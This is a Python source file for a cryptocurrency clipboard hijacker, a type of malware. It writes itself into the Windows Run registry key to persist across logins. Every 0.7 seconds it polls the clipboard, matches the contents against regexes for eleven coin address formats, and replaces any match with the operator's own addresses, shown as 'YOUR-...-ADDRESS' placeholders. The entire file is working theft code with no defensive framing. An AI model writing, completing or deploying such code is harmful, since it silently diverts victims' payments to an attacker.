import pyperclip
import time
import re


ADD_TO_STARTUP = True
HIDE_BINARIES = True


def startup():
    import os
    import winreg
    import inspect
    # Get the path of the script
    script_path = os.path.abspath(
        inspect.getframeinfo(inspect.currentframe()).filename)

    # Open the registry key where the startup entries are stored
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)

    # Add an entry for the script in the registry
    winreg.SetValueEx(reg_key, "cr", 0, winreg.REG_SZ, script_path)

    # Close the registry key
    winreg.CloseKey(reg_key)

    # Hide the script's binary files
    # os.system(f"attrib +h {script_path}")

    print("[*] Successfully added to startup:", script_path)


def check(clipboard):
    regex = {
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "tron": "^T[a-zA-Z0-9]{33}$",
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
        "eth": "^0x[a-fA-F0-9]{40}$",
        "sol": "^S[a-z0-9_-]{29,}$",
    }
    for key, value in regex.items():
        if bool(re.search(value, clipboard)):
            return key
    return 0


def replace_crypto(data):
    my_addresses = {
        "lite": "YOUR-LITE-ADDRESS",
        "dot": "YOUR-DOT-ADDRESS",
        "tron": "YOUR-TRON-ADDRESS",
        "btc": "YOUR-BTC-ADDRESS",
        "xrp": "YOUR-XRP-ADDRESS",
        "doge": "YOUR-DOGE-ADDRESS",
        "xmr": "YOUR-XMR-ADDRESS",
        "eth": "YOUR-ETH-ADDRESS",
        "ada": "YOUR-ADA-ADDRESS",
        "dash": "YOUR-DASH-ADDRESS",
        "sol": "YOUR-SOL-ADDRESS",
    }
    if data != 0 and my_addresses[data] != "null":
        pyperclip.copy(my_addresses[data])
    return 0


def main():
    while 1:
        time.sleep(0.7)
        clipboard = pyperclip.paste()
        data = check(clipboard)
        replace_crypto(data)


if __name__ == "__main__":
    if ADD_TO_STARTUP:
        startup()
    main()
